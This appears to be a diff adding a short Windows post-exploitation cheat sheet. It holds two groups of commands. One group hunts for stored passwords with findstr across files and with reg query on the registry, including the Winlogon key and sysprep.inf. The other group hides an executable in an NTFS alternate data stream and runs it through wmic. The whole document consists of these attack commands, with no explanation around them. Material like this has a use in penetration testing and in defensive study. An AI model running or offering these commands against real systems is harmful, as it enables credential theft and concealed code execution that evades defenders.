@@ -1,0 +1,17 @@
+Password Hunting		
+		findstr /si password *.txt
+		findstr /si password *.xml
+		dir /s *pass* == *cred* == *vnc* == *.config*
+		findstr /spin "password" *.*
+		reg query HKLM /f password /t REG_SZ /s
+		reg query HKCU /f password /t REG_SZ /s
+		findstr /si password *.ini
+		dir /b /s sysprep.inf
+		reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+		
+		
+Alternate Data Streams		
+		
+Create ADS		echo Hello World! > hello.txt:hidden
+Place executable in ADS		Set-Content -path <file> -value $(Get-Content $(Get-Command <executable>).Path -readcount 0 -encoding byte) -encoding byte -stream <your stream name>
+Executing ADS		wmic process call create $(Resolve-Path <file>:<stream name>)
